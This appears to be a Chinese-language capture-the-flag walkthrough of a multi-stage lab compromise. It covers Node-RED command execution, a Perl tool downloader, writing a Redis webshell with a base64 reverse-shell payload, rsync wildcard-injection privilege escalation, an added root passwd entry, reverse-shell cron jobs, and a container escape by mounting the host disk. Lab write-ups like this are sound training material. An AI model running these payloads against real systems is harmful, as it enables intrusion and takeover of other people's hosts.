# 信息收集

## TCP
```bash
┌──(root㉿MJ)-[/tmp/test]
└─# nmap --min-rate 10000 -p- 10.129.17.102
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-06 14:57 CST
Nmap scan report for 10.129.17.102 (10.129.17.102)
Host is up (0.19s latency).
Not shown: 65534 closed tcp ports (reset)
PORT     STATE SERVICE
1880/tcp open  vsat-control

Nmap done: 1 IP address (1 host up) scanned in 10.71 seconds

┌──(root㉿MJ)-[/tmp/test]
└─# nmap -sV -sC -O -p1880 10.129.17.102
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-06 14:57 CST
Nmap scan report for 10.129.17.102 (10.129.17.102)
Host is up (0.15s latency).

PORT     STATE SERVICE VERSION
1880/tcp open  http    Node.js Express framework
|_http-title: Error
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19
Network Distance: 2 hops

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.44 seconds
```

## UDP
```bash
┌──(root㉿MJ)-[/tmp/test]
└─# nmap -sU --top-ports 20 10.129.17.102
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-06 14:58 CST
Nmap scan report for 10.129.17.102 (10.129.17.102)
Host is up (0.12s latency).

PORT      STATE         SERVICE
53/udp    closed        domain
67/udp    closed        dhcps
68/udp    open|filtered dhcpc
69/udp    closed        tftp
123/udp   closed        ntp
135/udp   closed        msrpc
137/udp   closed        netbios-ns
138/udp   closed        netbios-dgm
139/udp   closed        netbios-ssn
161/udp   closed        snmp
162/udp   closed        snmptrap
445/udp   closed        microsoft-ds
500/udp   closed        isakmp
514/udp   closed        syslog
520/udp   closed        route
631/udp   closed        ipp
1434/udp  closed        ms-sql-m
1900/udp  closed        upnp
4500/udp  closed        nat-t-ike
49152/udp closed        unknown

Nmap done: 1 IP address (1 host up) scanned in 17.58 seconds
```

1880端口是web服务，Node.js Express 框架

```bash
┌──(root㉿MJ)-[/tmp/test]
└─# curl http://10.129.17.102:1880/
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Error</title>
</head>
<body>
<pre>Cannot GET /</pre>
</body>
</html>

┌──(root㉿MJ)-[/tmp/test]
└─# curl -X POST http://10.129.17.102:1880/
{"id":"4db178d6acb2d603fb188eda5fb10ac1","ip":"::ffff:10.10.16.15","path":"/red/{id}"}
```
返回提示/red/id
访问发现是未授权的  Node-RED接口，可以执行命令
![[Pasted image 20251206150321.png]]
如上设置即可执行命令，点击部署，在点击inject左边的小方块即可，inject设置文字列

# 立足点+横向移动

## docker(172.19.0.2/172.18.0.2)

```bash
root@nodered:/node-red# id
uid=0(root) gid=0(root) groups=0(root)
root@nodered:/node-red# ls -al /.dock*
-rwxr-xr-x 1 root root 0 May  4  2018 /.dockerenv
root@nodered:/node-red#
```
进来就是root，不过茛目dockerrnv文件也证实了这是docker容器，同样也可以使用
```bash
root@nodered:/node-red# cat /proc/1/cgroup
12:freezer:/docker/c075cbb82a4a9e0532ba61056d5651b7c855c0153c8156bf0c4eae3b1c4d25c9
11:hugetlb:/docker/c075cbb82a4a9e0532ba61056d5651b7c855c0153c8156bf0c4eae3b1c4d25c9
10:rdma:/
9:perf_event:/docker/c075cbb82a4a9e0532ba61056d5651b7c855c0153c8156bf0c4eae3b1c4d25c9
8:pids:/docker/c075cbb82a4a9e0532ba61056d5651b7c855c0153c8156bf0c4eae3b1c4d25c9
7:devices:/docker/c075cbb82a4a9e0532ba61056d5651b7c855c0153c8156bf0c4eae3b1c4d25c9
6:blkio:/docker/c075cbb82a4a9e0532ba61056d5651b7c855c0153c8156bf0c4eae3b1c4d25c9
5:memory:/docker/c075cbb82a4a9e0532ba61056d5651b7c855c0153c8156bf0c4eae3b1c4d25c9
4:cpu,cpuacct:/docker/c075cbb82a4a9e0532ba61056d5651b7c855c0153c8156bf0c4eae3b1c4d25c9
3:cpuset:/docker/c075cbb82a4a9e0532ba61056d5651b7c855c0153c8156bf0c4eae3b1c4d25c9
2:net_cls,net_prio:/docker/c075cbb82a4a9e0532ba61056d5651b7c855c0153c8156bf0c4eae3b1c4d25c9
1:name=systemd:/docker/c075cbb82a4a9e0532ba61056d5651b7c855c0153c8156bf0c4eae3b1c4d25c9
0::/system.slice/docker.service
root@nodered:/node-red#
```
### 判断是否为特权容器

```bash
root@nodered:/node-red# fdisk -l | grep -A 10 -i "device"
root@nodered:/node-red# cat /proc/1/status | grep -i "seccomp"
Seccomp:        2
root@nodered:/node-red# ls /dev
core  fd  full  mqueue  null  ptmx  pts  random  shm  stderr  stdin  stdout  tty  urandom  zero
```
可以看到是非特权容器


```bash
root@nodered:/node-red# capsh --print | grep sys_admin
root@nodered:/node-red# cat /sys/kernel/security/apparmor/profiles
cat: /sys/kernel/security/apparmor/profiles: No such file or directory
```
同样的不具备**CAP_SYS_ADMIN**这个功能，但没有开启**AppArmor**，这种情况下，除非具有已知漏洞，否则很难逃逸

## 一层内网横向
```bash
root@nodered:/node-red# ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
9: eth1@if10: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default
    link/ether 02:42:ac:13:00:02 brd ff:ff:ff:ff:ff:ff
    inet 172.19.0.2/16 brd 172.19.255.255 scope global eth1
       valid_lft forever preferred_lft forever
11: eth0@if12: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default
    link/ether 02:42:ac:12:00:02 brd ff:ff:ff:ff:ff:ff
    inet 172.18.0.2/16 brd 172.18.255.255 scope global eth0
       valid_lft forever preferred_lft forever
```
可以看到这个docker有两张内网网卡，考虑横向移动寻找突破点

### 工具传递

这是环境极其恶劣的docker环境，什么工具都没有，但是大多系统都具有perl环境，可以利用perl来传工具
```bash
root@nodered:/node-red# perl -v

This is perl 5, version 20, subversion 2 (v5.20.2) built for x86_64-linux-gnu-thread-multi
(with 101 registered patches, see perl -V for more detail)

Copyright 1987-2015, Larry Wall

Perl may be copied only under the terms of either the Artistic License or the
GNU General Public License, which may be found in the Perl 5 source kit.

Complete documentation for Perl, including FAQ lists, should be found on
this system using "man perl" or "perldoc perl".  If you have access to the
Internet, point your browser at http://www.perl.org/, the Perl Home Page.
```
#### 脚本
```perl
#!/usr/bin/perl
use strict;
use warnings;
use IO::Socket::INET;

die "Usage: perl downloader.pl <host> <port> <remote_path> <outfile>\n" unless @ARGV==4;
my ($host,$port,$path,$outfile)=@ARGV;
$path = "/$path" unless $path =~ m{^/};

my $sock = IO::Socket::INET->new(
    PeerAddr => $host,
    PeerPort => $port,
    Proto    => 'tcp',
    Timeout  => 10
) or die "connect failed to $host:$port: $!\n";

binmode $sock;
print $sock "GET $path HTTP/1.0\r\nHost: $host\r\nConnection: close\r\n\r\n";

open my $out, '>:raw', $outfile or die "open $outfile: $!\n";

my $buff = '';
my $header_parsed = 0;
while (1) {
    my $read;
    my $n = sysread($sock, $read, 8192);
    last unless $n;
    if (!$header_parsed) {
        $buff .= $read;
        my $idx = index($buff, "\r\n\r\n");
        if ($idx >= 0) {
            # write everything after the header
            my $body = substr($buff, $idx + 4);
            print $out $body if length $body;
            $buff = '';
            $header_parsed = 1;
        } else {
            # keep only last 3 bytes to avoid unlimited growth (boundary len 4)
            if (length($buff) > 4096) {
                $buff = substr($buff, -3);
            }
        }
    } else {
        print $out $read;
    }
}
close $out;
close $sock;
print "Saved $outfile\n";
```
用法`perl download.pl ip port remote_name local_name`
```bash
root@nodered:~# perl downloader.pl 10.10.16.15 2331 socat socat
Saved socat
root@nodered:~# perl downloader.pl 10.10.16.15 2331 curl curl
Saved curl
root@nodered:~# perl downloader.pl 10.10.16.15 2331 wget wget
Saved wget
root@nodered:~# perl downloader.pl 10.10.16.15 2331 nc nc
Saved nc
root@nodered:~# chmod +x *
root@nodered:~# ls -al
total 18128
drwx------ 1 root root     4096 Dec  6 07:20 .
drwxr-xr-x 1 root root     4096 Jul 15  2018 ..
-rw-r--r-- 1 root root      570 Jan 31  2010 .bashrc
drwx------ 1 root root     4096 Jul 15  2018 .config
drwx------ 1 root root     4096 Jul 15  2018 .gnupg
drwxr-xr-x 3 root root     4096 Jul 15  2018 .node-gyp
drwxr-xr-x 5 root root     4096 Jul 15  2018 .npm
-rw-r--r-- 1 root root      140 Nov 19  2007 .profile
-rwxr-xr-x 1 root root 10095352 Dec  6 07:20 curl
-rwxr-xr-x 1 root root     1307 Dec  6 07:16 downloader.pl
-rwxr-xr-x 1 root root  7100304 Dec  6 07:21 fscan
-rwxr-xr-x 1 root root   836848 Dec  6 07:20 nc
-rwxr-xr-x 1 root root   375176 Dec  6 07:19 socat
-rwxr-xr-x 1 root root   100712 Dec  6 07:20 wget
root@nodered:~#
```


先上线vshell，然后搭个socks5隧道，后续传文件都方便


```bash
root@nodered:~# fscan -h 172.19.0.1/24

   ___                              _
  / _ \     ___  ___ _ __ __ _  ___| | __
 / /_\/____/ __|/ __| '__/ _` |/ __| |/ /
/ /_\\_____\__ \ (__| | | (_| | (__|   <
\____/     |___/\___|_|  \__,_|\___|_|\_\
                     fscan version: 1.8.4
start infoscan
(icmp) Target 172.19.0.2      is alive
(icmp) Target 172.19.0.1      is alive
(icmp) Target 172.19.0.3      is alive
(icmp) Target 172.19.0.4      is alive
[*] Icmp alive hosts len is: 4
172.19.0.3:6379 open
172.19.0.4:80 open
[*] alive ports len is: 2
start vulscan
[*] WebTitle http://172.19.0.4         code:200 len:2023   title:Reddish
[+] Redis 172.19.0.3:6379 unauthorized file:/data/dump.rdb
[+] Redis 172.19.0.3:6379 like can write /var/spool/cron/
```
可以看到172.19.0.1/16这个内网段存在四台主机，172.18.0.1/16网段存活两台主机
```bash
root@nodered:~# fscan -h 172.19.0.1/16

   ___                              _
  / _ \     ___  ___ _ __ __ _  ___| | __
 / /_\/____/ __|/ __| '__/ _` |/ __| |/ /
/ /_\\_____\__ \ (__| | | (_| | (__|   <
\____/     |___/\___|_|  \__,_|\___|_|\_\
                     fscan version: 1.8.4
start infoscan
(icmp) Target 172.19.0.2      is alive
(icmp) Target 172.19.0.1      is alive
(icmp) Target 172.19.0.3      is alive
(icmp) Target 172.19.0.4      is alive
[*] LiveTop 172.19.0.0/16    段存活数量为: 4
[*] LiveTop 172.19.0.0/24    段存活数量为: 4
[*] Icmp alive hosts len is: 4
172.19.0.3:6379 open
172.19.0.4:80 open
[*] alive ports len is: 2
start vulscan
[*] WebTitle http://172.19.0.4         code:200 len:2023   title:Reddish
[+] Redis 172.19.0.3:6379 unauthorized file:/data/dump.rdb
[+] Redis 172.19.0.3:6379 like can write /var/spool/cron/
已完成 2/2
[*] 扫描结束,耗时: 13.378180729s

root@nodered:~# fscan -h 172.18.0.1/16

   ___                              _
  / _ \     ___  ___ _ __ __ _  ___| | __
 / /_\/____/ __|/ __| '__/ _` |/ __| |/ /
/ /_\\_____\__ \ (__| | | (_| | (__|   <
\____/     |___/\___|_|  \__,_|\___|_|\_\
                     fscan version: 1.8.4
start infoscan
(icmp) Target 172.18.0.2      is alive
(icmp) Target 172.18.0.1      is alive
[*] LiveTop 172.18.0.0/16    段存活数量为: 2
[*] LiveTop 172.18.0.0/24    段存活数量为: 2
[*] Icmp alive hosts len is: 2
[*] alive ports len is: 0
start vulscan
已完成 0/0
[*] 扫描结束,耗时: 6.357711346s
```
现在推断

**172.18.0.1/172.19.0.1是宿主机，172.19.0.3开放redis，172.19.0.4开放80，172.18.0.2/172.19.0.2是本机**

### redis未授权(172.19.0.3)

搭建好隧道，用kali打redis，不过写入定时任务失败，没能拿到shell
```bash
┌──(root㉿MJ)-[/tmp/test]
└─# proxychains4 redis-cli -h 172.19.0.3 -p 6379
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] Strict chain  ...  127.0.0.1:2335  ...  172.19.0.3:6379  ...  OK
172.19.0.3:6379> config get dir
1) "dir"
2) "/data"
172.19.0.3:6379>
```
### 内网web(172.19.0.4)
```bash
┌──(root㉿MJ)-[/tmp/test]
└─# proxychains4 curl http://172.19.0.4/
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] Strict chain  ...  127.0.0.1:2335  ...  172.19.0.4:80  ...  OK
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
    <head>
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
        <title>Reddish</title>
        <script src="assets/jquery.js" type="text/javascript"></script>
        <script type="text/javascript">
                                                $(document).ready(function () {
                                                                incrCounter();
                                                    getData();
                                                });

                                                function getData() {
                                                    $.ajax({
                                                        url: "8924d0549008565c554f8128cd11fda4/ajax.php?test=get hits",
                                                        cache: false,
                                                        dataType: "text",
                                                        success: function (data) {
                                                                                        console.log("Number of hits:", data)
                                                        },
                                                        error: function () {
                                                        }
                                                    });
                                                }

                                                function incrCounter() {
                                                    $.ajax({
                                                        url: "8924d0549008565c554f8128cd11fda4/ajax.php?test=incr hits",
                                                        cache: false,
                                                        dataType: "text",
                                                        success: function (data) {
                                              console.log("HITS incremented:", data);
                                                        },
                                                        error: function () {
                                                        }
                                                    });
                                                }

                                                /*
                                                        * TODO
                                                        *
                                                        * 1. Share the web folder with the database container (Done)
                                                        * 2. Add here the code to backup databases in /f187a0ec71ce99642e4f0afbd441a68b folder
                                                        * ...Still don't know how to complete it...
                                                */
                                                function backupDatabase() {
                                                                $.ajax({
                                                                                url: "8924d0549008565c554f8128cd11fda4/ajax.php?backup=...",
                                                                                cache: false,
                                                                                dataType: "text",
                                                                                success: function (data) {
                                                                                        console.log("Database saved:", data);
                                                                                },
                                                                                error: function () {
                                                                                }
                                                                });
                                                }
                </script>
    </head>
    <body><h1>It works!</h1>
    <p>This is the default web page for this server.</p>
    <p>The web server software is running but no content has been added, yet.</p>
    </body>
</html>
```

web有提示，暴露了`/f187a0ec71ce99642e4f0afbd441a68b`文件目录，可以尝试redis写入webshell

### shell(172.19.0.4)
#### redis未授权写入webshell
```bash
┌──(root㉿MJ)-[/tmp/test]
└─# proxychains4 curl 'http://172.19.0.4/f187a0ec71ce99642e4f0afbd441a68b/shell.php?1=id' --output info
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0   0     0   0     0     0     0  --:--:-- --:--:-- --:--:--     0[proxychains] Strict chain  ...  127.0.0.1:2335  ...  172.19.0.4:80  ...  OK
100   155   0   155   0     0   388     0  --:--:-- --:--:-- --:--:--   388

┌──(root㉿MJ)-[/tmp/test]
└─# cat info
REDIS0008�      redis-ver4.0.9�
redis-bits�@�ctime��3iused-mem��
                                �
                                 aof-preamble���xuid=33(www-data) gid=33(www-data) groups=33(www-data)
�2Ԍ^.>��                                                                                                          
┌──(root㉿MJ)-[/tmp/test]
└─#
```

这里用curl会输出文件，先测试一下一会直接写入反弹shell，走172.19.0.4的代理弹shell到kali上

这里有个小坑，靶机上的马过段时间就会被删掉

```bash
root@nodered:~# socat TCP4-LISTEN:2330,reuseaddr,fork TCP4:10.10.16.15:2330 &
[1] 129

┌──(root㉿MJ)-[~]
└─# nc -lvnp 2330
listening on [any] 2330 ...
```
socat做端口转发，一会kali接shell

```bash
┌──(root㉿MJ)-[/tmp/test]
└─# proxychains4 redis-cli -h 172.19.0.3 -p 6379
172.19.0.3:6379> config set dir /var/www/html/f187a0ec71ce99642e4f0afbd441a68b
OK
172.19.0.3:6379> config set dbfilename shell.php
OK
172.19.0.3:6379> set x '<?php system("echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xNzIuMTkuMC4yLzIzMzAgMD4mMQo= | base64 -d | bash");?>'
OK
172.19.0.3:6379> save
OK
172.19.0.3:6379>

┌──(root㉿MJ)-[/tmp/test]
└─# proxychains4 curl 'http://172.19.0.4/f187a0ec71ce99642e4f0afbd441a68b/shell.php'
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] Strict chain  ...  127.0.0.1:2335  ...  172.19.0.4:80  ...  OK

┌──(root㉿MJ)-[~]
└─# nc -lvnp 2330
listening on [any] 2330 ...
connect to [10.10.16.15] from (UNKNOWN) [10.129.17.102] 47712
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
www-data@www:/var/www/html/f187a0ec71ce99642e4f0afbd441a68b$
```
拿到www-datashell

#### root(172.19.0.4/172.20.0.3)

发现user.txt,不过somaro用户不存在，所以得提权root读user
```bash
www-data@www:/$ ls -la /home/somaro/
total 24
drwxr-xr-x 2 1000 1000 4096 Jul 16  2018 .
drwxr-xr-x 5 root root 4096 Apr  9  2021 ..
lrwxrwxrwx 1 root root    9 Apr  9  2021 .bash_history -> /dev/null
-rw-r--r-- 1 1000 1000  220 Apr 23  2018 .bash_logout
-rw-r--r-- 1 1000 1000 3771 Apr 23  2018 .bashrc
-rw-r--r-- 1 1000 1000  655 Apr 23  2018 .profile
-r-------- 1 1000 1000   33 Dec  6 06:51 user.txt
www-data@www:/$ id somaro
id: somaro: no such user
```

可以发现个备份文件
```bash
www-data@www:/backup$ cat backup.sh
cd /var/www/html/f187a0ec71ce99642e4f0afbd441a68b
rsync -a *.rdb rsync://backup:873/src/rdb/
cd / && rm -rf /var/www/html/*
rsync -a rsync://backup:873/src/backup/ /var/www/html/
chown www-data. /var/www/html/f187a0ec71ce99642e4f0afbd441a68b
```
这也解释了为什么传的马会被删掉

可以看到到root三分钟就会执行一次，而且在脚本中使用了通配符，所以可以利用提权
```bash
www-data@www:/backup$ cat /etc/cron.d/backup
*/3 * * * * root sh /backup/backup.sh
```

##### 例子

rsync的-e参数可以执行命令
```bash
┌──(root㉿MJ)-[/tmp/test]
└─# ls
'-e sh shell.rdb'   shell.rdb

┌──(root㉿MJ)-[/tmp/test]
└─# cat shell.rdb
cp /bin/bash /tmp/test/rootbash
chmod +s /tmp/test/rootbash

┌──(root㉿MJ)-[/tmp/test]
└─# rsync -a *.rdb rsync://backup:873/src/rdb/
rsync: did not see server greeting
rsync error: error starting client-server protocol (code 5) at main.c(1850) [sender=3.4.1]

┌──(root㉿MJ)-[/tmp/test]
└─# ls
'-e sh shell.rdb'   rootbash   shell.rdb
```

同理准备提权
```bash
www-data@www:/tmp$ echo 'cp /bin/bash /tmp/rootbash' > shell.rdb
www-data@www:/tmp$ echo 'chmod +s /tmp/rootbash' >> shell.rdb
www-data@www:/tmp$ cat shell.rdb
cp /bin/bash /tmp/rootbash
chmod +s /tmp/rootbash
www-data@www:/tmp$ touch ./'-e sh shell.rdb'
www-data@www:/tmp$ ls
-e sh shell.rdb  shell.rdb
www-data@www:/tmp$ mv ./'-e sh shell.rdb' /var/www/html/f187a0ec71ce99642e4f0afbd441a68b/
www-data@www:/tmp$ mv shell.rdb /var/www/html/f187a0ec71ce99642e4f0afbd441a68b/
www-data@www:/tmp$ ls -al /var/www/html/f187a0ec71ce99642e4f0afbd441a68b/
total 12
-rw-r--r-- 1 www-data www-data    0 Dec  6 08:11 -e sh shell.rdb
drwxr-xr-x 2 www-data www-data 4096 Dec  6 08:11 .
drwxr-xr-x 5 root     root     4096 Jul 15  2018 ..
-rw-r--r-- 1 www-data www-data   50 Dec  6 08:10 shell.rdb

www-data@www:/tmp$ ls -al
total 1016
drwxrwxrwt 1 root root    4096 Dec  6 08:12 .
drwxr-xr-x 1 root root    4096 Jul 15  2018 ..
-rwsr-sr-x 1 root root 1029624 Dec  6 08:12 rootbash
```
等待一会即可拿到rootbash，轻松拿下，不过perl有保护机制，这种情况下没法执行脚本下载工具，所以添加一个新root用户

```bash
┌──(root㉿MJ)-[~/tools/Linux]
└─# openssl passwd -1 -salt r00t r00t
$1$r00t$jI/eup4otheMWcP971kiR/

rootbash-4.3# echo 'r00t:$1$r00t$jI/eup4otheMWcP971kiR/:0:0:/root:/bin/bash' >> /etc/passwd
rootbash-4.3# su r00t
Password:
bash: /bin/bash/.bashrc: Not a directory
root@www:/tmp# id
uid=0(root) gid=0(root) groups=0(root)
```
入口机器再做个端口转发，下载工具用
```bash
root@nodered:~# socat TCP4-LISTEN:2331,reuseaddr,fork TCP4:10.10.16.15:2331 &
[2] 133

root@www:/root# perl downloader.pl 172.19.0.2 2331 fscan fscan
Saved fscan
root@www:/root# chmod +x fscan
root@www:/root# mv fscan /usr/bin/
root@www:/root# ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
17: eth0@if18: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default
    link/ether 02:42:ac:13:00:04 brd ff:ff:ff:ff:ff:ff
    inet 172.19.0.4/16 brd 172.19.255.255 scope global eth0
       valid_lft forever preferred_lft forever
19: eth1@if20: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default
    link/ether 02:42:ac:14:00:03 brd ff:ff:ff:ff:ff:ff
    inet 172.20.0.3/16 brd 172.20.255.255 scope global eth1
       valid_lft forever preferred_lft forever
```

同样的这台机器也是非特权容器，按照上述可以判断，同时也可以发现这个主机有一块新的内网网卡，网段172.20.0.1/16，继续打第二层内网



## 二层内网横向

### root(172.20.0.2)

```bash
root@www:/root# fscan -h 172.20.0.3/16

   ___                              _
  / _ \     ___  ___ _ __ __ _  ___| | __
 / /_\/____/ __|/ __| '__/ _` |/ __| |/ /
/ /_\\_____\__ \ (__| | | (_| | (__|   <
\____/     |___/\___|_|  \__,_|\___|_|\_\
                     fscan version: 1.8.4
start infoscan
(icmp) Target 172.20.0.3      is alive
(icmp) Target 172.20.0.1      is alive
(icmp) Target 172.20.0.2      is alive
[*] LiveTop 172.20.0.0/16    段存活数量为: 3
[*] LiveTop 172.20.0.0/24    段存活数量为: 3
[*] Icmp alive hosts len is: 3
172.20.0.3:80 open
[*] alive ports len is: 1
start vulscan
[*] WebTitle http://172.20.0.3         code:200 len:2023   title:Reddish
已完成 1/1
[*] 扫描结束,耗时: 6.862927535s
```
可以看到大概率172.20.0.1也是宿主机，还存活了一个172.20.0.2，刚才再定时任务备份文件中发现，这台docker容器会使用rsync与backup主机传递信息，所以本地的dns缓存一定可以看到这台主机的ip，可以猜测172.20.0.2就是backup了，同样下面也可以证实

```bash
root@www:/root# getent hosts backup
172.20.0.2      backup
```

这里的 **/src 不是系统路径**  
而是 rsync 守护进程配置文件里的 module 名称，配置文件一定存在
```bash
[src]
   path = /backup
   read only = false
   list = true
```

后续打下backup也可以证明这一点

```bash
root@www:/backup# cat backup.sh
cd /var/www/html/f187a0ec71ce99642e4f0afbd441a68b
rsync -a *.rdb rsync://backup:873/src/rdb/
cd / && rm -rf /var/www/html/*
rsync -a rsync://backup:873/src/backup/ /var/www/html/
chown www-data. /var/www/html/f187a0ec71ce99642e4f0afbd441a68b
```

既然能穿文件，可以先试一下，在backup主机的权限
```bash
root@www:/backup# echo 123 > test
root@www:/backup# rsync -a test rsync://backup:873/src/root/
root@www:/backup# rsync rsync://backup:873/src/root/test
-rw-r--r--              4 2025/12/06 08:28:32 test
```
root都能传那肯定就是root无疑了，写个定时任务弹shell即可

先去kali下个nc然后监听2333端口，接backup的shell即可,这里记得给sh加个执行权限，不然弹不上

```bash
root@www:/backup# ls
backup.sh  shell  shell.sh  test
root@www:/backup# cat shell
* * * * * root sh /tmp/shell.sh
root@www:/backup# cat shell.sh
#!/bin/bash
bash -i >& /dev/tcp/172.20.0.3/2333 0>&1

root@www:/backup# rsync -a shell.sh rsync://backup:873/src/tmp/shell.sh
root@www:/backup# rsync rsync://backup:873/src/tmp/shell.sh
-rw-r--r--             53 2025/12/06 08:34:58 shell.sh
root@www:/backup# rsync -a shell rsync://backup:873/src/etc/cron.d/shell
root@www:/backup# rsync rsync://backup:873/src/etc/cron.d/shell
-rw-r--r--             32 2025/12/06 08:35:53 shell
root@www:/backup# nc -lvnp 2333
listening on [any] 2333 ...
connect to [172.20.0.3] from (UNKNOWN) [172.20.0.2] 41556
bash: cannot set terminal process group (504): Inappropriate ioctl for device
bash: no job control in this shell
root@backup:~#id
uid=0(root) gid=0(root) groups=0(root)
root@backup:~# ls -al /.doc*
ls -al /.doc*
-rwxr-xr-x 1 root root 0 May  4  2018 /.dockerenv

```

### docker逃逸


可以看到还是个docker，现证实下猜想

```bash
root@backup:~# cat /etc/rsyncd.conf
cat /etc/rsyncd.conf
uid = root
gid = root
use chroot = no
max connections = 4
syslog facility = local5
pid file = /var/run/rsyncd.pid
log file = /var/log/rsyncd.log

[src]
path = /
comment = src path
read only = no
```

其实列一下dev就可以看出来是不是特权容器了，特权容器dev下文件很多，非特权就几个
```bash
ls /dev
```


可以看到主设备是sda2，挂载逃逸即可
```bash
root@backup:~# df -h
df -h
Filesystem      Size  Used Avail Use% Mounted on
overlay         5.3G  4.1G  1.2G  78% /
tmpfs            64M     0   64M   0% /dev
tmpfs           997M     0  997M   0% /sys/fs/cgroup
/dev/sda2       5.3G  4.1G  1.2G  78% /backup
shm              64M     0   64M   0% /dev/shm

root@backup:~# mkdir /mnt/evil
mkdir /mnt/evil
root@backup:~# mount /dev/sda2 /mnt/evil
mount /dev/sda2 /mnt/evil
```
这个时候已经可以使用root和主机交互了，不过仍然是docker的root不是主机的root，不过拿主机root就很简单了，没开ssh，写个定时任务继续弹shell即可

```bash
root@backup:~# ls -al /mnt/evil/root
ls -al /mnt/evil/root
total 32
drwx------  5 root root 4096 Dec  6 06:51 .
drwxr-xr-x 23 root root 4096 Dec  6  2023 ..
lrwxrwxrwx  1 root root    9 Jul 16  2018 .bash_history -> /dev/null
-rw-r--r--  1 root root 3106 Oct 22  2015 .bashrc
drwx------  2 root root 4096 Jul 15  2018 .cache
drwx------  3 root root 4096 Dec  6  2023 .gnupg
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
drwx------  2 root root 4096 Jul 15  2018 .ssh
-r--------  1 root root   33 Dec  6 06:51 root.txt
```
拿下



<img width="2557" height="1438" alt="Image" src="https://github.com/user-attachments/assets/428daf56-152b-4b4a-9c50-87726bc47334" />